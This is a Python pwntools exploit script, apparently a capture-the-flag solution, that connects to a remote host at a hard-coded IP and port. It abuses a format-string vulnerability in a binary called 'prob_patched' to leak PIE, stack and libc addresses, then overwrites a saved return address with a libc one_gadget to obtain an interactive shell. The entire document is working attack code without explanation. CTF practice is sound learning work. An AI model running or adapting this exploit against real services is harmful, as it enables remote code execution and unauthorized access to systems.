from pwn import *

elf = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("43.203.137.197", 54321)

def exec_fmt(payload):
    p.sendlineafter(b'> ', b'1')
    payload += b'\x00'
    output = b''
    for char in payload:
        output += int.to_bytes(0b1000000000000000|char, 2, 'little')

    p.send(output + b'\x00\x20')
    leak = recv()
    set_pos(0, 0)
    return leak.replace(b' ', b'').strip()

def recv():
    p.sendlineafter(b'> ', b'3')
    return p.recvuntil(b'\n1.', drop=True)

def set_pos(x, y):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(x).encode())
    p.sendlineafter(b'> ', str(y).encode())

def convert(payload):
    output = b''
    for char in payload:
        output += int.to_bytes(0b1000000000000000|char, 2, 'little')
    return output

def write(data):
    p.sendlineafter(b'> ', b'1')   
    data = int.to_bytes(0b1000000000000000|0x61, 2, 'little') + int.to_bytes(0x10f0, 2, "little") + convert(b'a' * 6 + data) + convert(b'\x00' * 4000) + b'\x00\x20'
    p.send(data)
    set_pos(0, 0)

    p.sendlineafter(b'> ', b'3')

fmt_str = FmtStr(execute_fmt=write, offset=13, numbwritten=8)

pieBase = u64(exec_fmt(b'%p')[5:11].ljust(8, b'\x00')) -  elf.symbols['__do_global_dtors_aux_fini_array_entry']
elf.address = pieBase

stack_leak = int(exec_fmt(f'%7$p'.encode())[:14], 16)
libc_base = int(exec_fmt(f"%555$p".encode())[:14], 16) -  libc.symbols['__libc_start_main'] - 128
libc.address = libc_base
rip = stack_leak + 0x28 - 0x40

# gdb.attach(p, "break *print_palette+367")

fmt_str.write(rip, libc_base + 0xebd43)
fmt_str.execute_writes()
p.interactive()